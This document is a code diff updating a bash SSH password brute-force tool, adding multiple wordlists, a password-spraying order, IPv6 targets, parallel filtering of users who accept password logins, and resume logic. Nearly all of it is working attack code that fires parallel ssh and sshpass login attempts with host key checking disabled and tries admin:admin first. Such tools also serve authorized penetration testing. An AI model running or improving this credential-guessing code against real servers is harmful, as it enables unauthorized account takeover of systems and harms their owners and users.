@@ -14,16 +14,21 @@
 
 # Fail a pipeline if any command in it fails, not just the last
 set -o pipefail
+# Catch unset variable expansions (requires bash 4.4+ for safe empty-array expansion)
+set -u
+# Pin locale for consistent regex matching and collation
+export LC_ALL=C
 
 ##############################
 # Constants and globals
 ##############################
 
-readonly VERSION="1.1"                                  # edit on every release
+readonly VERSION="1.2"                                  # edit on every release
 readonly SCRIPT_DIR="$(cd "$(dirname "${0}")" && pwd)"  # script absolute path
 readonly STATE_BASE="${SCRIPT_DIR}/.getsshpass"         # per-host subdirs
-readonly RETRY_SLEEP="0.05" # sleep between SSH connection error retries
-readonly POLL_SLEEP="0.05"  # sleep between job-slot availability polls
+readonly RETRY_SLEEP="0.05"       # sleep between SSH connection error retries
+readonly POLL_SLEEP="0.05"        # sleep between job-slot availability polls
+readonly PID_PRUNE_THRESHOLD=200  # prune CHILD_PIDS when array exceeds this size
 
 declare ASKPASS_SCRIPT=""     # path to temp SSH_ASKPASS helper script
 declare STATE_DIR=""          # per-host state subdirectory path
@@ -38,14 +43,20 @@ declare max_retries="50"  # max retries per attempt on SSH errors (255)
 declare ssh_timeout="8"   # SSH connection timeout in seconds
 
 declare host=""            # target SSH hostname or IP
+declare ssh_host=""        # SSH-safe host: [addr] for IPv6, raw otherwise
 declare clear_state=""     # set by --clear flag
 declare list_wordlists=""  # set by --list flag
 declare use_sshpass=""     # set by --sshpass flag
-declare userlist=""        # active username file (trimmed on resume)
-declare userlist_orig=""   # original username file path (for .new cleanup)
-declare passlist=""        # active password file (trimmed on resume)
-declare passlist_orig=""   # original password file path (for .new cleanup)
-declare fullpasslist=""    # full password file path (for total count)
+declare first_flag="u"     # "u"=users outer loop, "d"=passwords outer (spray)
+declare -a userlist_files=() # username files supplied via -u (one or more)
+declare COMBINED_USERLIST="" # temp file when multiple -u files are joined
+declare userlist=""          # active username file (trimmed on resume)
+declare userlist_orig=""     # original username file path (for .new cleanup)
+declare -a passlist_files=() # password files supplied via -d (one or more)
+declare COMBINED_PASSLIST="" # temp file when multiple -d files are joined
+declare passlist=""          # active password file (trimmed on resume)
+declare passlist_orig=""     # original password file path (for .new cleanup)
+declare fullpasslist=""      # full password file path (for total count)
 declare fulluserlist=""    # full username file path (for total count)
 
 declare -a CHILD_PIDS=()      # child PIDs for cleanup
@@ -55,6 +66,7 @@ declare -i attempt=0         # running attempt counter
 declare -i total_attempts=0  # total combinations to try
 declare -i maxusercount=0    # total users (set in restore_progress, read by progress_bar_setup)
 declare -i maxpasscount=0    # total passwords (set in restore_progress, read by progress_bar_setup)
+declare -i declared_usercount=0  # users before password-auth filtering
 
 ##############################
 # Terminal colors and logging
@@ -203,6 +215,10 @@ cleanup() {
   [[ -n "${passlist_orig}" && -f "${passlist_orig}.new" ]] \
     && rm -f "${passlist_orig}.new"
 
+  [[ -n "${COMBINED_USERLIST}" && -f "${COMBINED_USERLIST}" ]] \
+    && rm -f "${COMBINED_USERLIST}"
+  [[ -n "${COMBINED_PASSLIST}" && -f "${COMBINED_PASSLIST}" ]] \
+    && rm -f "${COMBINED_PASSLIST}"
   [[ -n "${ASKPASS_SCRIPT}" && -f "${ASKPASS_SCRIPT}" ]] \
     && rm -f "${ASKPASS_SCRIPT}"
 }
@@ -382,10 +398,23 @@ progress_bar_setup() {
     # at PB_SCROLL_BOTTOM and printing with \n — each \n scrolls the region
     # up one row, placing the line safely above PB_TRIED_ROW.
     if (( ! is_resize )); then
-      local fmt_val
+      local fmt_val fmt_declared users_label
+      if (( declared_usercount > 0 )); then
+        local fmt_filtered
+        format_number "${maxusercount}" fmt_filtered
+        format_number "${declared_usercount}" fmt_declared
+        printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] %s/%s users allow password authentication\n' \
+          "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_filtered}" "${fmt_declared}"
+      fi
       format_number "${maxusercount}" fmt_val
+      if (( declared_usercount > 0 && declared_usercount != maxusercount )); then
+        format_number "${declared_usercount}" fmt_declared
+        users_label="${fmt_val} / ${fmt_declared}"
+      else
+        users_label="${fmt_val}"
+      fi
       printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Users:                       %s\n' \
-        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
+        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${users_label}"
       format_number "${maxpasscount}" fmt_val
       printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords:                   %s\n' \
         "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
@@ -409,15 +438,15 @@ progress_bar_setup() {
 progress_bar_draw() {
   # Jump to PB_DRAW_ROW (absolute) so background subprocesses that wrote \n
   # and moved the cursor elsewhere don't cause the attempt line to land on
-  # a pinned row. \033[K clears the line; \033[?7l disables wrap.
-  printf '\033[%d;1H\033[K\033[?7l' "${PB_DRAW_ROW}"
+  # a pinned row. \033[?7l disables wrap; \033[K after content clears the tail.
+  printf '\033[%d;1H\033[?7l' "${PB_DRAW_ROW}"
   printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] ' \
     -1 "${CYAN}" "${RESET}"
   printf \
     'Trying user: '\''%b%s%b'\'' password: '\''%b%s%b'\''' \
     "${CYAN}" "${1}" "${RESET}" \
     "${YELLOW}" "${2}" "${RESET}"
-  printf '\033[?7h'
+  printf '\033[K\033[?7h'
 }
 
 progress_bar_update() {
@@ -505,15 +534,14 @@ read_args() {
       -u|--users)
         [[ ${#} -lt 2 ]] \
           && { msg_fail "Option ${1} requires an argument"; exit 1; }
-        userlist="${2}"
-        userlist_orig="${userlist}"
+        userlist_files+=("${2}")
         shift 2
         ;;
       -d|--dictionary)
         [[ ${#} -lt 2 ]] \
           && { msg_fail "Option ${1} requires an argument"; exit 1; }
-        passlist="${2}"
-        passlist_orig="${passlist}"
+        passlist_files+=("${2}")
+        [[ ${#userlist_files[@]} -eq 0 ]] && first_flag="d"
         shift 2
         ;;
       -w|--wait)
@@ -577,7 +605,7 @@ read_args() {
   done
 }
 
-# Validate the target host as an IPv4 address or hostname.
+# Validate the target host as an IPv4/IPv6 address or hostname.
 validate_host() {
   if [[ -z "${host}" ]]; then
     msg_fail "Host address cannot be empty"
@@ -595,6 +623,11 @@ validate_host() {
         exit 1
       fi
     done
+    ssh_host="${host}"
+  elif [[ "${host}" == *:* ]]; then
+    # Bracket-wrap for SSH; SSH itself validates the IPv6 address and will
+    # produce a clear "cannot connect" error if it's malformed.
+    ssh_host="[${host}]"
   else
     local host_regex='^[a-zA-Z0-9]'
     host_regex+='([a-zA-Z0-9\-]*[a-zA-Z0-9])?'
@@ -604,6 +637,7 @@ validate_host() {
         "'${host}' is not a valid IP address or hostname"
       exit 1
     fi
+    ssh_host="${host}"
   fi
 }
 
@@ -714,26 +748,42 @@ check_args() {
   fi
 
   local errors=0
-  if [[ ! -f "${passlist}" ]]; then
-    msg_fail "Cannot find password file: '${passlist:-<not specified>}'"
+  if [[ ${#passlist_files[@]} -eq 0 ]]; then
+    msg_fail "Cannot find password file: '<not specified>'"
     (( errors++ ))
-  elif [[ ! -r "${passlist}" ]]; then
-    msg_fail "Cannot read password file: '${passlist}'"
-    (( errors++ ))
-  elif [[ ! -s "${passlist}" ]]; then
-    msg_fail "Password file is empty: '${passlist}'"
-    (( errors++ ))
+  else
+    local pf
+    for pf in "${passlist_files[@]}"; do
+      if [[ ! -f "${pf}" ]]; then
+        msg_fail "Cannot find password file: '${pf}'"
+        (( errors++ ))
+      elif [[ ! -r "${pf}" ]]; then
+        msg_fail "Cannot read password file: '${pf}'"
+        (( errors++ ))
+      elif [[ ! -s "${pf}" ]]; then
+        msg_fail "Password file is empty: '${pf}'"
+        (( errors++ ))
+      fi
+    done
   fi
 
-  if [[ ! -f "${userlist}" ]]; then
-    msg_fail "Cannot find username file: '${userlist:-<not specified>}'"
+  if [[ ${#userlist_files[@]} -eq 0 ]]; then
+    msg_fail "Cannot find username file: '<not specified>'"
     (( errors++ ))
-  elif [[ ! -r "${userlist}" ]]; then
-    msg_fail "Cannot read username file: '${userlist}'"
-    (( errors++ ))
-  elif [[ ! -s "${userlist}" ]]; then
-    msg_fail "Username file is empty: '${userlist}'"
-    (( errors++ ))
+  else
+    local uf
+    for uf in "${userlist_files[@]}"; do
+      if [[ ! -f "${uf}" ]]; then
+        msg_fail "Cannot find username file: '${uf}'"
+        (( errors++ ))
+      elif [[ ! -r "${uf}" ]]; then
+        msg_fail "Cannot read username file: '${uf}'"
+        (( errors++ ))
+      elif [[ ! -s "${uf}" ]]; then
+        msg_fail "Username file is empty: '${uf}'"
+        (( errors++ ))
+      fi
+    done
   fi
 
   (( errors > 0 )) && exit 1
@@ -744,7 +794,32 @@ check_args() {
     exit 1
   }
 
+  if (( ${#passlist_files[@]} == 1 )); then
+    passlist="${passlist_files[0]}"
+  else
+    COMBINED_PASSLIST="$(mktemp)" || {
+      msg_fail \
+        "Cannot create temp file for combined password list"
+      exit 1
+    }
+    cat "${passlist_files[@]}" > "${COMBINED_PASSLIST}"
+    passlist="${COMBINED_PASSLIST}"
+  fi
+  passlist_orig="${passlist}"
   fullpasslist="${passlist}"
+
+  if (( ${#userlist_files[@]} == 1 )); then
+    userlist="${userlist_files[0]}"
+  else
+    COMBINED_USERLIST="$(mktemp)" || {
+      msg_fail \
+        "Cannot create temp file for combined username list"
+      exit 1
+    }
+    cat "${userlist_files[@]}" > "${COMBINED_USERLIST}"
+    userlist="${COMBINED_USERLIST}"
+  fi
+  userlist_orig="${userlist}"
   fulluserlist="${userlist}"
 }
 
@@ -774,7 +849,7 @@ create_askpass_helper() {
 
 # Quick-win credential test with admin:admin and SSH reachability check.
 check_ssh_connection() {
-  msg_info "Checking SSH connection to '${host}:${port}'..."
+  msg_info "Checking SSH connection to '${ssh_host}:${port}'..."
 
   local rvalssh
   if [[ -n "${use_sshpass}" ]]; then
@@ -782,7 +857,7 @@ check_ssh_connection() {
       -o StrictHostKeyChecking=no \
       -o PubkeyAuthentication=no \
       -o ConnectTimeout="${ssh_timeout}" \
-      -p "${port}" "admin@${host}" exit &>/dev/null
+      -p "${port}" "admin@${ssh_host}" exit &>/dev/null
     rvalssh=${?}
     if [[ "${rvalssh}" -eq 0 ]]; then
       msg_ok "Connection successful"
@@ -792,7 +867,7 @@ check_ssh_connection() {
       evaluate_result
     elif [[ "${rvalssh}" -eq 255 || "${rvalssh}" -eq 3 ]]; then
       msg_error \
-        "Cannot establish SSH connection to '${host}:${port}'"
+        "Cannot establish SSH connection to '${ssh_host}:${port}'"
       exit 1
     else
       msg_ok "Connection successful"
@@ -805,7 +880,7 @@ check_ssh_connection() {
       -o PubkeyAuthentication=no \
       -o NumberOfPasswordPrompts=1 \
       -o ConnectTimeout="${ssh_timeout}" \
-      -p "${port}" "admin@${host}" exit 2>&1 >/dev/null)
+      -p "${port}" "admin@${ssh_host}" exit 2>&1 >/dev/null)
     rvalssh=${?}
     if [[ "${rvalssh}" -eq 0 ]]; then
       msg_ok "Connection successful"
@@ -816,7 +891,7 @@ check_ssh_connection() {
     elif [[ "${rvalssh}" -eq 255 ]] \
         && [[ "${ssh_err}" != *"Permission denied"* ]]; then
       msg_error \
-        "Cannot establish SSH connection to '${host}:${port}'"
+        "Cannot establish SSH connection to '${ssh_host}:${port}'"
       exit 1
     else
       msg_ok "Connection successful"
@@ -833,6 +908,7 @@ filter_users_by_password_auth() {
     printf "Reuse cached list? [Y/n] "
     read -r answer
     if [[ ! "${answer}" =~ ^[Nn]$ ]]; then
+      declared_usercount="$(grep -c '' "${userlist}")"
       userlist="${FILTERED_USERLIST}"
       userlist_orig="${FILTERED_USERLIST}"
       fulluserlist="${FILTERED_USERLIST}"
@@ -845,7 +921,9 @@ filter_users_by_password_auth() {
   > "${FILTERED_USERLIST}"  # truncate file to start fresh
   local total_users
   total_users="$(grep -c '' "${userlist}")"
-  local -a filter_pids=()
+  declared_usercount="${total_users}"
+  local -a filter_pids=() active_fps=()
+  local fp safe_user
   local filter_tmp="${STATE_DIR}/filter_tmp"
   rm -rf "${filter_tmp}"
   mkdir -p "${filter_tmp}"
@@ -857,6 +935,17 @@ filter_users_by_password_auth() {
   while IFS= read -r user || [[ -n "${user}" ]]; do
     user="${user%$'\r'}"
     [[ -z "${user}" ]] && continue
+    if (( max_jobs > 0 )); then
+      while true; do
+        active_fps=()
+        for fp in "${filter_pids[@]}"; do
+          kill -0 "${fp}" 2>/dev/null && active_fps+=("${fp}")
+        done
+        filter_pids=("${active_fps[@]}")
+        (( ${#filter_pids[@]} < max_jobs )) && break
+        sleep "${POLL_SLEEP}"
+      done
+    fi
     (
       local status
       status="$(ssh \
@@ -864,9 +953,9 @@ filter_users_by_password_auth() {
         -o StrictHostKeyChecking=no \
         -o PubkeyAuthentication=no \
         -o ConnectTimeout="${ssh_timeout}" \
-        -p "${port}" "${user}@${host}" echo ok 2>&1)"
+        -p "${port}" "${user}@${ssh_host}" echo ok 2>&1)"
       if [[ "${status}" =~ password|keyboard-interactive ]]; then
-        local safe_user="${user//\//%2F}"
+        safe_user="${user//\//%2F}"
         printf '%s\n' "${user}" > "${filter_tmp}/${safe_user}"
       fi
     ) &
@@ -882,7 +971,7 @@ filter_users_by_password_auth() {
   while IFS= read -r user || [[ -n "${user}" ]]; do
     user="${user%$'\r'}"
     [[ -z "${user}" ]] && continue
-    local safe_user="${user//\//%2F}"
+    safe_user="${user//\//%2F}"
     [[ -f "${filter_tmp}/${safe_user}" ]] \
       && printf '%s\n' "${user}" >> "${FILTERED_USERLIST}"
   done < "${userlist}"
@@ -935,27 +1024,52 @@ restore_progress() {
         | grep -Fxn -- "${lastpass}")"
       rvalpass=${?}
 
-      if [[ "${rvaluser}" -eq 0 ]]; then
-        local rowuser="${row1user%%:*}"
-        tail -n +"${rowuser}" "${userlist}" \
-          > "${userlist}.new"
-        userlist="${userlist}.new"
-      else
-        msg_warn \
-          "User '${lastuser}' not found in user list," \
-          "starting from beginning"
-        rm -f "${RESUME_FILE}"
-      fi
+      if [[ "${first_flag}" == "u" ]]; then
+        if [[ "${rvaluser}" -eq 0 ]]; then
+          local rowuser="${row1user%%:*}"
+          tail -n +"${rowuser}" "${userlist}" \
+            > "${userlist}.new"
+          userlist="${userlist}.new"
+        else
+          msg_warn \
+            "User '${lastuser}' not found in user list," \
+            "starting from beginning"
+          rm -f "${RESUME_FILE}"
+        fi
 
-      if [[ "${rvaluser}" -eq 0 && "${rvalpass}" -eq 0 ]]; then
-        local rowpass="${row1pass%%:*}"
-        tail -n +"${rowpass}" "${passlist}" \
-          > "${passlist}.new"
-        passlist="${passlist}.new"
-      elif [[ "${rvaluser}" -eq 0 && "${rvalpass}" -ne 0 ]]; then
-        msg_warn \
-          "Password '${lastpass}' not found in password list," \
-          "starting passwords from beginning"
+        if [[ "${rvaluser}" -eq 0 && "${rvalpass}" -eq 0 ]]; then
+          local rowpass="${row1pass%%:*}"
+          tail -n +"${rowpass}" "${passlist}" \
+            > "${passlist}.new"
+          passlist="${passlist}.new"
+        elif [[ "${rvaluser}" -eq 0 && "${rvalpass}" -ne 0 ]]; then
+          msg_warn \
+            "Password '${lastpass}' not found in password list," \
+            "starting passwords from beginning"
+        fi
+      else
+        if [[ "${rvalpass}" -eq 0 ]]; then
+          local rowpass="${row1pass%%:*}"
+          tail -n +"${rowpass}" "${passlist}" \
+            > "${passlist}.new"
+          passlist="${passlist}.new"
+        else
+          msg_warn \
+            "Password '${lastpass}' not found in password list," \
+            "starting from beginning"
+          rm -f "${RESUME_FILE}"
+        fi
+
+        if [[ "${rvalpass}" -eq 0 && "${rvaluser}" -eq 0 ]]; then
+          local rowuser="${row1user%%:*}"
+          tail -n +"${rowuser}" "${userlist}" \
+            > "${userlist}.new"
+          userlist="${userlist}.new"
+        elif [[ "${rvalpass}" -eq 0 && "${rvaluser}" -ne 0 ]]; then
+          msg_warn \
+            "User '${lastuser}' not found in user list," \
+            "starting users from beginning"
+        fi
       fi
     fi
   fi
@@ -966,16 +1080,25 @@ restore_progress() {
   total_attempts=$(( maxusercount * maxpasscount ))
   remaining_users="$(grep -c '' "${userlist}")"
   remaining_passes="$(grep -c '' "${passlist}")"
-  # Completed = total - remaining in current user's pass list
-  #   - (remaining users after current) * full pass list size
-  attempt=$(( total_attempts - remaining_passes \
-    - (remaining_users - 1) * maxpasscount ))
+  if [[ "${first_flag}" == "u" ]]; then
+    attempt=$(( total_attempts - remaining_passes \
+      - (remaining_users - 1) * maxpasscount ))
+  else
+    attempt=$(( total_attempts - remaining_users \
+      - (remaining_passes - 1) * maxusercount ))
+  fi
   if (( attempt < 0 )); then attempt=0; fi
 
   if (( attempt > 0 )); then
-    local fmt_val
+    local fmt_val fmt_declared users_label
     format_number "${maxusercount}" fmt_val
-    msg_info "Users:                       ${fmt_val}"
+    if (( declared_usercount > 0 && declared_usercount != maxusercount )); then
+      format_number "${declared_usercount}" fmt_declared
+      users_label="${fmt_val} / ${fmt_declared}"
+    else
+      users_label="${fmt_val}"
+    fi
+    msg_info "Users:                       ${users_label}"
     format_number "${maxpasscount}" fmt_val
     msg_info "Passwords:                   ${fmt_val}"
     format_number "${total_attempts}" fmt_val
@@ -1008,7 +1131,7 @@ try_ssh() {
         -o StrictHostKeyChecking=no \
         -o PubkeyAuthentication=no \
         -o ConnectTimeout="${ssh_timeout}" \
-        -p "${port}" "${user}@${host}" exit &>/dev/null
+        -p "${port}" "${user}@${ssh_host}" exit &>/dev/null
       retval=${?}
       # sshpass: 0=success, 5=auth failure, 3/255=connection error
       [[ "${retval}" -eq 0 || "${retval}" -eq 5 ]] && break
@@ -1019,7 +1142,7 @@ try_ssh() {
         -o PubkeyAuthentication=no \
         -o NumberOfPasswordPrompts=1 \
         -o ConnectTimeout="${ssh_timeout}" \
-        -p "${port}" "${user}@${host}" exit 2>&1 >/dev/null)
+        -p "${port}" "${user}@${ssh_host}" exit 2>&1 >/dev/null)
       retval=${?}
       # ssh exits 255 for both auth failure and connection errors.
       # Only retry on connection errors (auth failure contains "Permission denied").
@@ -1067,7 +1190,7 @@ wait_for_job_slot() {
 
 # Print attack configuration summary before pre-flight checks.
 print_attack_config() {
-  local ssh_method jobs_label
+  local ssh_method jobs_label users_label passes_label
   if [[ -n "${use_sshpass}" ]]; then
     ssh_method="sshpass"
   else
@@ -1078,22 +1201,85 @@ print_attack_config() {
   else
     jobs_label="max ${max_jobs}"
   fi
-  msg_info "Target:              ${host}:${port}"
+  local orig_ifs="${IFS}"
+  IFS=' + '
+  users_label="${userlist_files[*]}"
+  passes_label="${passlist_files[*]}"
+  IFS="${orig_ifs}"
+  msg_info "Target:              ${ssh_host}:${port}"
   msg_info "SSH method:          ${ssh_method}"
   msg_info "SSH parallel jobs:   ${jobs_label}"
   msg_info "SSH delay:           ${delay}s"
   msg_info "SSH timeout:         ${ssh_timeout}s"
   msg_info "SSH retries:         ${max_retries}"
+  msg_info "Users file:          ${users_label}"
+  msg_info "Passwords file:      ${passes_label}"
+  if [[ "${first_flag}" == "u" ]]; then
+    msg_info "Attack order:        users first"
+  else
+    msg_info "Attack order:        passwords first (spray)"
+  fi
+}
+
+# Run the nested attack loop for a given outer/inner file pair.
+# Args: outer_file inner_file full_inner_file order("u"|"d")
+run_attack_loop() {
+  local outer_file="${1}" inner_file="${2}"
+  local full_inner_file="${3}" order="${4}"
+  local outer_val inner_val user pass fmt_att fmt_tot
+
+  # || [[ -n ]] handles files missing a trailing newline
+  # ${var%$'\r'} strips Windows carriage return (\r\n -> \n)
+  while IFS= read -r outer_val || [[ -n "${outer_val}" ]]; do
+    outer_val="${outer_val%$'\r'}"
+    [[ -z "${outer_val}" ]] && continue
+    while IFS= read -r inner_val || [[ -n "${inner_val}" ]]; do
+      inner_val="${inner_val%$'\r'}"
+      [[ -z "${inner_val}" ]] && continue
+      if [[ "${order}" == "u" ]]; then
+        user="${outer_val}"; pass="${inner_val}"
+      else
+        user="${inner_val}"; pass="${outer_val}"
+      fi
+      [[ -f "${RESULT_FILE}" ]] && evaluate_result
+      ((attempt++))
+      if [[ -t 1 ]] && (( PB_TRIED_ROW > 0 )); then
+        progress_bar_draw "${user}" "${pass}"
+        progress_bar_update "${attempt}" "${total_attempts}"
+      else
+        format_number "${attempt}" fmt_att
+        format_number "${total_attempts}" fmt_tot
+        printf \
+          '[%s/%s] Trying user: '\''%s'\'' password: '\''%s'\''\n' \
+          "${fmt_att}" "${fmt_tot}" "${user}" "${pass}"
+      fi
+      printf '%s\t%s\n' "${user}" "${pass}" > "${RESUME_FILE}"
+      wait_for_job_slot
+      # </dev/null prevents background job from stealing the
+      # wordlist file descriptor that the outer read loop uses
+      try_ssh "${user}" "${pass}" </dev/null &
+      CHILD_PIDS+=("${!}")
+      (( ${#CHILD_PIDS[@]} > PID_PRUNE_THRESHOLD )) && prune_finished_pids
+      sleep "${delay}"
+    done < "${inner_file}"
+    inner_file="${full_inner_file}"
+  done < "${outer_file}"
 }
 
 # Main attack loop.
 launch_attack() {
   # Reset bash builtin timer so elapsed_time() measures attack only
   SECONDS=0
-  local fmt_val fmt_att fmt_tot
+  local fmt_val fmt_declared users_label
   if (( attempt == 0 )); then
     format_number "${maxusercount}" fmt_val
-    msg_info "Users:                       ${fmt_val}"
+    if (( declared_usercount > 0 && declared_usercount != maxusercount )); then
+      format_number "${declared_usercount}" fmt_declared
+      users_label="${fmt_val} / ${fmt_declared}"
+    else
+      users_label="${fmt_val}"
+    fi
+    msg_info "Users:                       ${users_label}"
     format_number "${maxpasscount}" fmt_val
     msg_info "Passwords:                   ${fmt_val}"
     format_number "${total_attempts}" fmt_val
@@ -1106,45 +1292,11 @@ launch_attack() {
     (( PB_TRIED_ROW > 0 )) && progress_bar_update "${attempt}" "${total_attempts}"
   fi
 
-  # || [[ -n ]] handles files missing a trailing newline
-  # ${var%$'\r'} strips Windows carriage return (\r\n -> \n)
-  while IFS= read -r user || [[ -n "${user}" ]]; do
-    user="${user%$'\r'}"
-    [[ -z "${user}" ]] && continue
-    while IFS= read -r pass || [[ -n "${pass}" ]]; do
-      pass="${pass%$'\r'}"
-      [[ -z "${pass}" ]] && continue
-
-      if [[ -f "${RESULT_FILE}" ]]; then
-        evaluate_result
-      fi
-
-      ((attempt++))
-      if [[ -t 1 ]] && (( PB_TRIED_ROW > 0 )); then
-        progress_bar_draw "${user}" "${pass}"
-        progress_bar_update "${attempt}" "${total_attempts}"
-      else
-        format_number "${attempt}" fmt_att
-        format_number "${total_attempts}" fmt_tot
-        printf \
-          '[%s/%s] Trying user: '\''%s'\'' password: '\''%s'\''\n' \
-          "${fmt_att}" "${fmt_tot}" "${user}" "${pass}"
-      fi
-
-      printf '%s\t%s\n' "${user}" "${pass}" > "${RESUME_FILE}"
-
-      wait_for_job_slot
-      # </dev/null prevents background job from stealing the
-      # wordlist file descriptor that the outer read loop uses
-      try_ssh "${user}" "${pass}" </dev/null &
-      CHILD_PIDS+=("${!}")
-      (( attempt % 100 == 0 )) && prune_finished_pids
-
-      sleep "${delay}"
-    done < "${passlist}"
-    # Reset to full password list for the next username
-    passlist="${fullpasslist}"
-  done < "${userlist}"
+  if [[ "${first_flag}" == "u" ]]; then
+    run_attack_loop "${userlist}" "${passlist}" "${fullpasslist}" "u"
+  else
+    run_attack_loop "${passlist}" "${userlist}" "${fulluserlist}" "d"
+  fi
 
   # Wait for all background try_ssh jobs before checking results
   wait
@@ -1159,7 +1311,7 @@ evaluate_result() {
 
   if [[ -f "${RESULT_FILE}" ]]; then
     printf \
-      '\r\033[K%(%Y-%m-%d %H:%M:%S)T [%bOK   %b] %b%s%b\n' \
+      '\a\r\033[K%(%Y-%m-%d %H:%M:%S)T [%bOK   %b] %b%s%b\n' \
       -1 "${GREEN}" "${RESET}" \
       "${GREEN}${BOLD}" "$(<"${RESULT_FILE}")" "${RESET}"
     elapsed_time
